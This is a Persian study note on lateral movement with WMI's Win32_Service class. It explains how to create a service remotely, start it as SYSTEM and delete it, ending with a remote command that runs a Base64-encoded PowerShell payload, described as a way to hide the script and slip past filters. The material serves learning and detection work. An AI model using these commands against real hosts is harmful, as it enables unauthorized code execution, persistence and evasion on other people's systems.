

-  It is possible to create a service on a remote machine using WMI to execute commands and scripts.
-  This also allows persistence capabilities. Of course, this is more noisy than simply starting
a process.

---

# 1. مفهوم کلی
**Lateral Movement – Command Execution – Win32_Service**

در ویندوز می‌توان با استفاده از کلاس **`Win32_Service` در WMI** یک سرویس جدید ایجاد کرد.  
این سرویس می‌تواند:

- یک برنامه اجرا کند
- یک اسکریپت اجرا کند
- روی سیستم محلی یا **سیستم ریموت** ساخته شود

بنابراین با ساخت سرویس، می‌توان **کدی را روی سیستم هدف اجرا کرد**.

---

# 2. تعریف پارامترهای سرویس

در ابتدا دو مقدار بایت تعریف شده است:

```powershell
$ServiceType = [byte] 16
$Errorcontrol = [byte] 1
```

### ServiceType = 16
مشخص می‌کند نوع سرویس چیست.

مقدار **16** یعنی:

```
SERVICE_WIN32_OWN_PROCESS
```

یعنی سرویس در **یک Process مستقل** اجرا می‌شود.

---

### ErrorControl = 1

مشخص می‌کند اگر سرویس در هنگام شروع خطا بدهد چه اتفاقی بیفتد.

مقدار **1** یعنی:

```
SERVICE_ERROR_NORMAL
```

یعنی:
- خطا ثبت می‌شود
- سیستم به کار خود ادامه می‌دهد.

---

# 3. ایجاد سرویس با WMI

دستور اصلی:

```powershell
Invoke-WmiMethod -Class Win32_Service -Name Create `
-ArgumentList $false, "windows Performance", $errorcontrol, $null, $null,
"winperf","c:\windows\System32\calc.exe", $null, $servicetype,
"Manual","NT AUTHORITY\SYSTEM",""
```

این دستور متد **Create** از کلاس `Win32_Service` را اجرا می‌کند.

---

# 4. توضیح پارامترهای ArgumentList

متد `Create()` پارامترهای زیادی دارد. در این مثال مهم‌ترین‌ها:

### 1️⃣ Display Name
```
"windows Performance"
```

نامی که در **Services.msc** نمایش داده می‌شود.

---

### 2️⃣ ErrorControl
```
$errorcontrol
```

همان مقدار **1** که قبلاً تعریف شد.

---

### 3️⃣ Service Name
```
"winperf"
```

نام واقعی سرویس در سیستم.

---

### 4️⃣ PathName
```
"c:\windows\System32\calc.exe"
```

مسیر برنامه‌ای که سرویس اجرا می‌کند.

در این مثال:

```
Calculator اجرا می‌شود
```

---

### 5️⃣ ServiceType
```
$servicetype
```

نوع سرویس (Process مستقل).

---

### 6️⃣ StartMode
```
"Manual"
```

حالت شروع سرویس.

انواع آن:

- `Automatic`
- `Manual`
- `Disabled`

در اینجا یعنی **به صورت دستی اجرا می‌شود**.

---

### 7️⃣ Service Account
```
"NT AUTHORITY\SYSTEM"
```

سرویسی که ساخته می‌شود با **دسترسی SYSTEM** اجرا می‌شود.

این بالاترین سطح دسترسی در ویندوز است.

---

### 8️⃣ Password
```
""
```

چون حساب SYSTEM استفاده شده، پسورد نیاز نیست.

---

# 5. نتیجه اجرای دستور

بعد از اجرای دستور:

یک سرویس جدید ساخته می‌شود با مشخصات:

نام سرویس:
```
winperf
```

نام نمایشی:
```
windows Performance
```

برنامه اجرا شده:
```
calc.exe
```

حساب اجرا:
```
SYSTEM
```

حالت شروع:
```
Manual
```

---

# 6. چرا این روش مهم است؟

ساخت سرویس چند مزیت دارد:

### اجرای برنامه با دسترسی بالا
اگر دسترسی Administrator داشته باشی، سرویس می‌تواند با **SYSTEM** اجرا شود.

---

### اجرای دستور روی سیستم ریموت
WMI اجازه می‌دهد این کار را روی **سیستم دیگر در شبکه** انجام دهی.

---

### ایجاد Persistence
اگر سرویس را روی **Automatic** بگذاری:

با هر بار بوت سیستم اجرا می‌شود.

---

# 7. تفاوت با اجرای ساده Process

در متن اشاره شده:

> This is more noisy than simply starting a process

یعنی:

ساخت سرویس نسبت به اجرای یک Process معمولی **بیشتر قابل شناسایی است** چون:

- در **Event Log** ثبت می‌شود
- در **Service Manager** دیده می‌شود
- ابزارهای امنیتی آن را راحت‌تر تشخیص می‌دهند

---

# 8. منابع

دو لینک داده شده برای توضیح کامل API:

**Microsoft Documentation**

https://msdn.microsoft.com/en-us/library/aa389390(v=vs.85).aspx

مستند رسمی متد `Win32_Service.Create`

---

**NetSPI Blog**

https://blog.netspi.com/getting-started-wmi-weaponization-part-3/

آموزش عملی استفاده از WMI برای اجرای دستورات.

---


![[Pasted image 20260309161621.png]]


---

# 1. اجرای سرویس (Start the Service)

### دستور

```powershell
Get-WmiObject -Class Win32_Service -Filter 'Name="WinPerf"' |
Invoke-WmiMethod -Name StartService
```

## توضیح مرحله به مرحله

### 1️⃣ گرفتن سرویس از طریق WMI

```powershell
Get-WmiObject -Class Win32_Service
```

این دستور:

- کلاس **Win32_Service** را از WMI می‌خواند
- تمام سرویس‌های سیستم را برمی‌گرداند.

---

### 2️⃣ فیلتر کردن سرویس مورد نظر

```powershell
-Filter 'Name="WinPerf"'
```

یعنی فقط سرویسی را برگردان که:

```
ServiceName = WinPerf
```

پس نتیجه این بخش:

```
یک شیء WMI مربوط به سرویس WinPerf
```

---

### 3️⃣ ارسال خروجی به دستور بعدی (Pipeline)

```powershell
|
```

شیء سرویس گرفته شده به دستور بعدی ارسال می‌شود.

---

### 4️⃣ اجرای متد StartService

```powershell
Invoke-WmiMethod -Name StartService
```

این دستور:

متد **StartService()** از کلاس `Win32_Service` را اجرا می‌کند.

در نتیجه:

```
سرویس WinPerf شروع به کار می‌کند
```

و برنامه‌ای که برای آن تعریف شده اجرا می‌شود.

مثلاً اگر Path این باشد:

```
C:\Windows\System32\calc.exe
```

نتیجه:

```
Calculator اجرا می‌شود
```

---

# 2. حذف سرویس (Remove the Service)

### دستور

```powershell
Get-WmiObject -Class Win32_Service -Filter 'Name="WinPerf"' |
Remove-WmiObject
```

---

## توضیح مرحله به مرحله

### 1️⃣ گرفتن سرویس از WMI

همان دستور قبلی:

```powershell
Get-WmiObject -Class Win32_Service
```

---

### 2️⃣ فیلتر کردن سرویس

```powershell
-Filter 'Name="WinPerf"'
```

فقط سرویس مورد نظر انتخاب می‌شود.

---

### 3️⃣ حذف سرویس

```powershell
Remove-WmiObject
```

این دستور:

شیء WMI مربوط به سرویس را **حذف می‌کند**.

در نتیجه:

```
سرویس WinPerf از سیستم پاک می‌شود
```

و دیگر در:

```
services.msc
```

وجود نخواهد داشت.

---

# 3. ترتیب کامل عملیات

معمولاً این فرآیند به ترتیب زیر انجام می‌شود:

### 1️⃣ ایجاد سرویس

```
Invoke-WmiMethod -Class Win32_Service -Name Create
```

↓

### 2️⃣ اجرای سرویس

```
Invoke-WmiMethod -Name StartService
```

↓

### 3️⃣ حذف سرویس

```
Remove-WmiObject
```

---

# 4. نکته مهم درباره WMI

کلاس **Win32_Service** چند متد مهم دارد:

| متد | کاربرد |
|----|----|
| Create | ساخت سرویس |
| StartService | شروع سرویس |
| StopService | توقف سرویس |
| ChangeStartMode | تغییر حالت Start |
| Delete | حذف سرویس |

---

✅ نکته جالب:  
همین عملیات را می‌توان بدون WMI هم انجام داد با ابزارهای ویندوز مثل:

```
sc create
sc start
sc delete
```

که در واقع **Service Control Manager** را مستقیماً صدا می‌زنند.

---

# 1. هدف دستور

هدف این دستور:

- اتصال به یک سیستم در شبکه  
- ساخت یک سرویس ویندوز روی آن سیستم  
- اجرای یک دستور PowerShell  
- اجرا شدن دستور با دسترسی **SYSTEM**

سیستم هدف در مثال:

```
192.168.0.35
```

---

# 2. دستور کامل

```powershell
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,
"windows Performance", $errorcontrol, $null, $null, "winPerf",
"C:\Windows\System32\cmd.exe /c powershell -e <Base64EncodedScript>",
$null, $servicetype, "Manual", "NT AUTHORITY\SYSTEM",""
-ComputerName 192.168.0.35
-Credential opsdc\wmiadmin
```

---

# 3. بخش‌های مهم دستور

## 1️⃣ کلاس WMI

```
-Class Win32_Service
```

این کلاس برای **مدیریت سرویس‌های ویندوز** استفاده می‌شود.

---

## 2️⃣ متد مورد استفاده

```
-Name Create
```

متد **Create()** برای ساخت یک سرویس جدید است.

---

# 4. پارامترهای مهم ArgumentList

### نام نمایشی سرویس

```
"windows Performance"
```

نامی که در **Services Manager** نمایش داده می‌شود.

---

### نام واقعی سرویس

```
"winPerf"
```

نام داخلی سرویس در سیستم.

---

### برنامه‌ای که سرویس اجرا می‌کند

```
C:\Windows\System32\cmd.exe /c powershell -e <Base64EncodedScript>
```

ساختار دستور:

```
cmd.exe
   ↓
powershell
   ↓
execute encoded script
```

---

# 5. معنی پارامتر `-e` در PowerShell

```
powershell -e
```

یا

```
powershell -EncodedCommand
```

یعنی:

```
اجرای یک اسکریپت PowerShell که به صورت Base64 کدگذاری شده است
```

مزایا:

- مخفی کردن محتوای اسکریپت
- جلوگیری از مشکلات encoding
- عبور راحت‌تر از برخی فیلترها

---

# 6. اجرای سرویس با دسترسی بالا

```
"NT AUTHORITY\SYSTEM"
```

یعنی سرویس با حساب:

```
SYSTEM
```

اجرا می‌شود که بالاترین سطح دسترسی در ویندوز است.

---

# 7. اجرای دستور روی سیستم راه‌دور

بخش مهم این دستور:

```
-ComputerName 192.168.0.35
```

یعنی دستور روی سیستم زیر اجرا می‌شود:

```
192.168.0.35
```

نه روی سیستم فعلی.

---

# 8. اعتبارنامه اتصال

```
-Credential opsdc\wmiadmin
```

یعنی برای اتصال به سیستم هدف از این حساب استفاده می‌شود:

```
Domain/User = opsdc\wmiadmin
```

اگر این حساب دسترسی Administrator داشته باشد، می‌تواند سرویس بسازد.

---

# 9. نتیجه اجرای این دستور

پس از اجرای دستور:

روی سیستم **192.168.0.35**

یک سرویس ساخته می‌شود که:

- نام: `winPerf`
- حساب اجرا: `SYSTEM`
- برنامه اجرا: PowerShell script

و بعد از **StartService**، اسکریپت اجرا می‌شود.

---

# 10. چرا از سرویس استفاده می‌شود؟

چون سرویس‌ها:

- می‌توانند با **SYSTEM** اجرا شوند
- از طریق **WMI Remote** قابل ساخت هستند
- می‌توانند **command execution** انجام دهند

---

# 11. جریان کامل عملیات

```
Attacker Machine
        │
        │ WMI RPC
        ▼
Target Machine (192.168.0.35)
        │
        ▼
Win32_Service.Create()
        │
        ▼
Service Control Manager
        │
        ▼
cmd.exe
        │
        ▼
powershell -EncodedCommand
        │
        ▼
Execute Script
```

---

